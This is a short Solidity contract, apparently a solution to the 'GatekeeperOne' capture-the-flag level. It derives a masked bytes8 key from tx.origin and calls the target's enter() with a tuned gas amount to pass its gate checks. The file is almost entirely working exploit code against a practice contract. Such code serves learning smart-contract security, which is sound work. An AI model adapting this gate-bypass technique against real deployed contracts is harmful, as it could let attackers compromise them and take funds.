// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./GatekeeperOne.sol";

contract HackGates {
    GatekeeperOne public gates = GatekeeperOne(<contract instance>);
    address public hax = tx.origin;
    //bytes8 key = bytes8(hax) & 0xFFFFFFFF0000FFFF; // solidity < 0.8.0
    bytes8 public key = bytes8(uint64(uint160(hax))) & 0xFFFFFFFF0000FFFF; // solidity >= 0.8.0

    function hackGate(uint gasVal) public returns (bool success) {   
        //(success) = gates.enter{gas:gasVal}(key); /// 82286 results at 81910 gas remaining at MOD. 81910 mod(8191) = 0
        (success,) = address(gates).call{gas:gasVal}(abi.encodeWithSignature("enter(bytes8)", key));
    }
}